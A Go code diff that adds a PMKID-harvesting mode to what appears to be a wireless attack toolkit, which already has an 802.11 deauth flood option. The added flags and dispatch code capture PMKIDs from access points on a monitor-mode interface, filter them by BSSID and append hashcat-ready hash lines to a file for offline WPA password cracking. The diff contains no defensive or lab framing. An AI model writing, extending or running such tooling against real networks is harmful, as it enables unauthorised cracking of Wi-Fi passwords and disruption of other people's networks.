@@ -64,6 +64,11 @@ func main() {
 	deauthBurst := flag.Int("deauth-burst", 3, "802.11 deauth: frames per interval")
 	deauthInterval := flag.Duration("deauth-interval", 0, "802.11 deauth: delay between bursts (0 = flood)")
 	deauthDuration := flag.Duration("deauth-duration", 10*time.Second, "802.11 deauth: total run time")
+	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
+	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
+	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
+	pmkidBSSID := flag.String("pmkid-bssid", "", "PMKID: only emit hits for this BSSID")
+	pmkidOut := flag.String("pmkid-out", "", "PMKID: write hashcat lines to this file (append)")
 	flag.Parse()
 
 	if *pluginFlag != "" {
@@ -137,6 +142,39 @@ func main() {
 				log.Printf("[deauth] %v", derr)
 			}
 		}
+	}
+
+	// pmkid dispatch — harvests PMKID from EAPOL msg 1, writes hashcat lines
+	if *pmkidIface != "" {
+		pctx, pcancel := context.WithTimeout(context.Background(), *pmkidDuration)
+		var hitsFile *os.File
+		if *pmkidOut != "" {
+			f, err := os.OpenFile(*pmkidOut, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+			if err != nil {
+				log.Printf("[pmkid] open %s: %v", *pmkidOut, err)
+			} else {
+				hitsFile = f
+				defer hitsFile.Close()
+			}
+		}
+		onHit := func(h wireless.PMKIDHit) {
+			line := h.HashcatLine()
+			log.Printf("[pmkid] %s bssid=%s sta=%s pmkid=%x",
+				h.TS.Format("15:04:05"), h.BSSID, h.Station, h.PMKID)
+			if hitsFile != nil {
+				fmt.Fprintln(hitsFile, line)
+				hitsFile.Sync()
+			}
+		}
+		if err := wireless.Harvest(pctx, wireless.PMKIDOptions{
+			Iface:       *pmkidIface,
+			Channel:     *pmkidChannel,
+			Duration:    *pmkidDuration,
+			FilterBSSID: *pmkidBSSID,
+		}, onHit); err != nil {
+			log.Printf("[pmkid] %v", err)
+		}
+		pcancel()
 	}
 
 	if *dnsBind != "" {
